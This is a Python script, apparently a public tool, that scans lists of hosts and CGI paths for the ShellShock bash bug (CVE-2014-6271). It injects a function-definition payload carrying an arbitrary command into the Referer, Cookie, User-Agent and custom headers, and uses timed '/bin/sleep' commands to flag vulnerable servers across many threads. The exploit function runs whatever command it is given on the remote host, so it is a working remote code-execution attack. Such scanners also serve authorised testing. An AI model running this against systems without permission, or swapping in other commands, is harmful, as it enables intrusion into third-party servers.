#!/usr/bin/env python
# Author: Mario Rivas Vivar
# https://twitter.com/Grifo

"""
Scan a list of hosts with a list of CGIs trying to exploit
 the ShellShock vulnerability (CVE-2014-6271)
"""

import httplib,urllib,sys,time
import pprint
import csv

from threading import Thread
from Queue import Queue

SLEEP_TIME=9
DELAY_TIME=5
TIMEOUT=10
ERRORS_TO_ABORT = 5
protocol=''
target_results = []
concurrent = 20

def exploit(target_host, cgi_path, command):
    # print >> sys.stderr, "Connecting to %s - %s" %(target_host, cgi_path)
    if protocol == 'http':
        conn = httplib.HTTPConnection(target_host, timeout=TIMEOUT)
    elif protocol == 'https':
        conn = httplib.HTTPSConnection(target_host, timeout=TIMEOUT)
    elif target_host.endswith('443'):   #https for 443,9443,...
        conn = httplib.HTTPSConnection(target_host, timeout=TIMEOUT)
    else:
        conn = httplib.HTTPConnection(target_host, timeout=TIMEOUT)

    shellcode="() { gmvaudit;};%s" % command

    headers = {"Content-type": "application/x-www-form-urlencoded",
        "Referer": shellcode,
        "Cookie": shellcode,
        "User-Agent": shellcode,
        "test": shellcode,
        }
    start = time.time()
    conn.request("GET", cgi_path, headers=headers)
    res = conn.getresponse()
    end = time.time()
    delay = end - start
    # print >> sys.stderr, "%s:\t[%s]\t%s %s\t%s" %(target_host, command, res.status, res.reason, delay) 
    return (res.status, res.reason, delay)

def testSleep(target_host, cgi_path):
    try:
        status1 = reason1 = delay1 = status2 = reason2 = delay2 = None
        command1 = "/bin/sleep 0"	#Yes I know.. but I was too lazy to do just a normal request
        command2 = "/bin/sleep %s" % SLEEP_TIME
        status1, reason1, delay1 = exploit(target_host, cgi_path, command1)
        status2, reason2, delay2 = exploit(target_host, cgi_path, command2)
        warning = delay2 > SLEEP_TIME
        vulnerable = warning and delay2-delay1>DELAY_TIME
        if vulnerable: 
            print "%s%s\t VULNERABLE" %(target_host, cgi_path)
        print "%s%s - %s - %s" %(target_host, cgi_path, vulnerable, delay2)
        return {'host': target_host,
                'cgi_path': cgi_path,
                'requests': [(command1, status1,reason1,delay1), (command2,status2,reason2,delay2)],
                'vulnerable' : vulnerable,
                'warning' : warning,
                'error': False,
                'delay_diff' : delay2-delay1
                }
    except:
        # Probably exception with the connection
        return {'host': target_host,
                'cgi_path': cgi_path,
                'requests': [(command1,status1,reason1,delay1), (command2,status2,reason2,delay2)],
                'vulnerable' : False,
                'warning' : False,
                'error': True,
                'delay_diff' : None
                }

def testCGIList(target_host, cgi_list):
    test_list = []
    errors = 0
    for cgi_path in cgi_list:
        cgitest = testSleep(target_host, cgi_path)
        test_list.append(cgitest)
        if cgitest['error'] is True:
            errors +=1;
        else:
            errors = 0
        if errors >= ERRORS_TO_ABORT:
            print "%s aborted due to %s consecutive connection errors" %(cgitest['host'], ERRORS_TO_ABORT)
            break;
    return test_list

def threadWork():
    global target_results
    while True:
        (target, cgi_list) = q.get()
        host_tests = testCGIList(target, cgi_list)
        target_results.append(host_tests)
        q.task_done()

def scan(target_list, cgi_list):
    global q
    q = Queue(concurrent * 2)
    for i in range(concurrent):
        t = Thread(target=threadWork)
        t.daemon = True
        t.start()
    try:
        for target in target_list:
            q.put((target, cgi_list))
        q.join()
    except keyboartInterrupt:
        return


def writeCSV(target_results, output):
    csvf = open(output, 'w')
    csvw = csv.writer(csvf, csv.excel)
    csvw.writerow(['HOST', 'CGIPATH', 'VULNERABLE', 'ERROR','WARNING', 'COMMAND1', 'STATUS1', 'REASON1', 'DELAY1', 'COMMAND2','STATUS2', 'REASON2', 'DELAY2', 'DELAY_DIFF'])
    target_results.sort()
    for host_list in target_results:
        for test in host_list:
            l = [
                test['host'],
                test['cgi_path'],
                test['vulnerable'],
                test['error'],
                test['warning'],
                test['requests'][0][0],
                test['requests'][0][1],
                test['requests'][0][2],
                test['requests'][0][3],
                test['requests'][1][0],
                test['requests'][1][1],
                test['requests'][1][2],
                test['requests'][1][3],
                test['delay_diff']
            ]
            pprint.pprint(l)
            csvw.writerow(l)

    csvf.close()


def main():
    if (len(sys.argv)<4):
        print "Usage: %s <host_file> <CGI_file> <output.csv> [threads] [http|https]" % sys.argv[0]
        print "Example: %s hosts.txt cgi_list.txt results.csv 20 http" % sys.argv[0]
        exit(0)
    
    target_list = [line.strip() for line in open(sys.argv[1]).readlines() if len(line.strip())>0]
    cgi_list = [line.strip() for line in open(sys.argv[2]).readlines() if len(line.strip())>0]
    
    try:
        global concurrent
        concurrent = int(sys.argv[4])
    except:
        pass

    try:
        if sys.argv[5] != 'http' and sys.argv[5] != 'https':
            print "Incorrect protocol, %s" %sys.argv[5]
            exit(0)
        global protocol
        protocol=sys.argv[5]
    except:
        pass


    scan(target_list, cgi_list)
    # pprint.pprint(target_results)
    writeCSV(target_results, sys.argv[3]) 
    exit(0)

if __name__ == '__main__':
    main()

